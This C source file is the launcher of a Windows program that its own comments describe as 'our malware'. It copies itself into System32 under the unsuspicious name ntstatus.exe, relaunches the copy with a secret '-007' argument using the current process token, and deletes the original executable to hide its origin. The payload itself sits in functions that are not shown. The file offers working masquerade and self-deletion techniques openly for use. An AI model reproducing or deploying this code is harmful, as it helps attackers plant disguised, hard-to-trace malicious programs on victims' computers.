
#include <stdio.h>

#include "program/program.h"


#define EXEC_PATH1 "C:\\Windows\\System32\\ntstatus.exe"  // give our malware an unsuspicious new name
#define EXEC_PATH2 "C:\\Windows\\SysWOW64\\ntstatus.exe"  // give our malware an unsuspicious new name
#define REQUIRED_ARG "-007"

static void run(char* path, char* requArg);
static void copyAndLaunch(char* path);

int main(int argc, char** argv) {
    if (argc == 1) {
        copyAndLaunch(argv[0]);
    } else if (argc == 2) {
        run(argv[0], argv[1]);
    } else {
        exit(0);
    }
}

static void run(char* path, char* requArg) {
    // ensure we are being run from the correct place with -007 arg!
    if ((strcmp(path, EXEC_PATH1) != 0 && strcmp(path, EXEC_PATH2) != 0) || strcmp(requArg, REQUIRED_ARG) != 0) { 
        exit(1);
    }

    // run the code as normal
    int ret = setup();
    if (ret != ECODE_SUCCESS) {
        printErr(ret);
        programCleanup();
        exit(ret);
    }
    
    ret = startThreads();
    printf("Cleaning up.\nProgram exited with msg: %s", getErrMessage(ret));

    programCleanup();
    exit(0);
}

static void copyAndLaunch(char* path) {
    FILE* original = fopen(path, "rb");
    FILE* target = fopen(EXEC_PATH1, "wb");
    if (original == NULL || target == NULL) { exit(1); }

    int ch;
    while ((ch = fgetc(original)) != EOF) { fputc(ch, target); }
    fclose(target);
    fclose(original);
    printf("Created SYS32 Executable..\n");

    HANDLE hToken;
    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
        printf("Failed to open process token.\nExiting...\n");
        exit(1);
    }

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // pass the token to our privileged process!, NULL, as well as the command to be executed
    // the NULL lets use use the command line
    char cmd[256];
    snprintf(cmd, 256, "\"%s\" %s", EXEC_PATH1, REQUIRED_ARG);
    BOOL ret = CreateProcessAsUserA(
        hToken, NULL, cmd, //"\"C:\\Windows\\System32\\secret.exe\" -007",
        NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi
    );

    if(!ret) {
        printf("CreateProcess failed (%ld).\n", GetLastError());
        exit(1);
    }
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("Exiting worker...\n");
    remove(path); // remove the original module!
    exit(0);
}


// static void run();

// int main(int argc, char** argv) {
//     run();
// }

// static void run() {
//     int ret = setup();
//     if (ret != ECODE_SUCCESS) {
//         printErr(ret);
//         programCleanup();
//         exit(ret);
//     }

//     ret = startThreads();
//     printf("Cleaning up.\nProgram exited with msg: %s", getErrMessage(ret));

//     programCleanup();
//     exit(0);
// }